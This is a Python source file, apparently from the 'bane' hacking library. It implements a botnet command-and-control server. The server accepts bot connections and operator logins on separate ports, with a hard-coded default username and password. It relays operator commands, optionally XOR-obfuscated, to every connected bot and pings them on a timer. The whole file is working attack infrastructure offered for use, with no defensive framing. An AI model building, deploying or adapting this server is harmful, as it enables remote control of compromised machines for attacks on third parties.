import socket,sys,os,time
import threading
from bane.cryptographers.xor import XOR



class Botnet_C_C_Server:

    banner="\r\n\r\n\tWelcome To Bane's C&C server !\r\n\r\n"
    username_prompt='\r\nLogin: '
    password_prompt="\r\npassword: "
    user_prompt="{}@bane-C&C:$"

    def ping(self):
        while True:
            try:
                time.sleep(self.pings_interval)
                self.send_command(self.ping_command)
            except:
                break

    def login(self,**kwargs):
        if kwargs in self.users:
            return True
        return False

    def send_command(self,command):
        dead_bots=[]
        while True:
            time.sleep(0.1)
            if self.sending==False:
                break
        self.sending=True
        for client_socket in self.bots_list:
            try:
                if self.xor_encryption_key!=None:
                    command=XOR.encrypt(command,self.xor_encryption_key)
                else:
                    command=command
                client_socket.send("{}".format(command).encode())
            except Exception as ex:
                #raise Exception(ex)
                try:
                    client_socket.close()
                except:
                    pass
                dead_bots.append(client_socket)
        for x in dead_bots:
            self.bots_list.remove(x)
        self.sending=False

    def handle_bot(self,client_socket):
        try:
            for x in self.initial_commands_list:
                if self.xor_encryption_key!=None:
                    command=XOR.encrypt(x,self.xor_encryption_key)
                else:
                    command=x
                client_socket.send("{}".format(command).encode())
                while True:
                    data = client_socket.recv(self.socket_buffer_size)
                    if not data:
                        break
        except Exception as exx:
            pass#raise Exception(exx)


    def handle_user(self,client_socket):
        try:
            banner=Botnet_C_C_Server.banner+Botnet_C_C_Server.username_prompt
            client_socket.send(banner.encode())
            user=''
            while True:
                user+=client_socket.recv(self.socket_buffer_size).decode()
                if '\n' in user:
                    user=user.strip()
                    break
            client_socket.send(Botnet_C_C_Server.password_prompt.encode())
            pwd=''
            while True:
                pwd+=client_socket.recv(self.socket_buffer_size).decode()
                if '\n' in pwd:
                    pwd=pwd.strip()
                    break
            if self.login(username=user,password=pwd)==True:
                client_socket.send(Botnet_C_C_Server.user_prompt.format(user).strip().encode())
                while True:
                    data=''
                    while True:
                        data+=client_socket.recv(self.socket_buffer_size).decode()
                        if '\n' in data:
                            data=data.strip()
                            break
                    self.send_command(data.strip())   
                    client_socket.send('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip().encode())
            else:
                client_socket.send('login failed'.encode())
                client_socket.close()
        except Exception as ex:
            pass
        try:
            client_socket.close()
        except:
            pass

    def __init__(self,users_host='0.0.0.0',ping_command='',pings_interval=5,threads_daemon=False,users_port=22222,bots_host='0.0.0.0',bots_port=7777,socket_buffer_size=4096,max_users=5,max_bots=100,logs=False,initial_commands_list=[],xor_encryption_key=None,users=[{"username":"ala_sensei","password":"ala_sensei"}]):
        self.ping_command=ping_command
        self.bots_list=[]
        self.bots_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bots_server.bind((bots_host, bots_port))
        self.bots_server.listen(max_bots) 
        self.users_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.users_server.bind((users_host, users_port))
        self.users_server.listen(max_users) 
        self.sending=False
        self.pings_interval=pings_interval
        self.users=users
        self.threads_daemon=threads_daemon
        self.xor_encryption_key=xor_encryption_key
        self.logs=logs
        self.initial_commands_list=initial_commands_list
        self.socket_buffer_size=socket_buffer_size
        if self.logs==True:
            print("[*] Listening for bots on {}:{}".format(bots_host,bots_port))
            print("[*] Listening for users on {}:{}".format(users_host,users_port))
        t1 = threading.Thread(target=self.run_bots_server)
        t1.threads_daemon=self.threads_daemon
        t1.start()
        t2 = threading.Thread(target=self.run_users_server)
        t2.threads_daemon=self.threads_daemon
        t2.start()
        t3 = threading.Thread(target=self.ping)
        t3.threads_daemon=self.threads_daemon
        t3.start()
    
    def run_bots_server(self):
        while True:
            client, addr = self.bots_server.accept()
            if self.logs==True:
                print("[*] Accepted connection from: {}:{}".format(addr[0],addr[1]))
            self.bots_list.append(client)
            client_handler = threading.Thread(target=self.handle_bot, args=(client,))
            client_handler.threads_daemon=self.threads_daemon
            client_handler.start()
    

    def run_users_server(self):
        while True:
            client, addr = self.users_server.accept()
            if self.logs==True:
                print("[*] Accepted connection from: {}:{}".format(addr[0],addr[1]))
            client_handler = threading.Thread(target=self.handle_user, args=(client,))
            client_handler.threads_daemon=self.threads_daemon
            client_handler.start()
    
    def kill(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)
        #sys.exit()